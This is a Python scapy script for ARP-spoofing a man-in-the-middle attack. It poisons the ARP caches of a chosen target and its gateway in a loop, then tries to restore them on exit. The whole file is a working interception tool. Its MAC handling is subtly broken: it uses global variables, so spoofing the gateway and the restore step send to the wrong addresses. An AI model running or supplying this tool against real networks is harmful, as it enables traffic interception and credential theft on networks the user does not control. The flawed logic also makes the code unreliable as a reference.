#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP of a target machine.")
    parser.add_option("-g", "--gateway", dest="gateway", help="IP of a gateway.")
    _options, _args = parser.parse_args()
    if not _options.target:
        parser.error("\n[-] Please specify target to perform man in the middle attack.")
    elif not _options.gateway:
        parser.error("\n[-] Please specify gateway to perform man in the middle attack.")
    else:
        return _options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(packet, verbose=False)


def restore(source_ip, destination_ip):
    # source_mac = get_mac(source_ip)
    # destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, psrc=source_ip, pdst=destination_ip, hwdst=destination_mac, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


arguments = get_arguments()
target = arguments.target
gateway = arguments.gateway
# Get mac
target_mac = get_mac(target)
source_mac = get_mac(gateway)
destination_mac = get_mac(target)

packets_sent_counter = 0
try:
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        packets_sent_counter += 2
        print("\r[+] Packets Sent: " + str(packets_sent_counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore(target, gateway)
    restore(gateway, target)
    print("\n[+] Restoring arp tables.")
    print("[+] Bye")
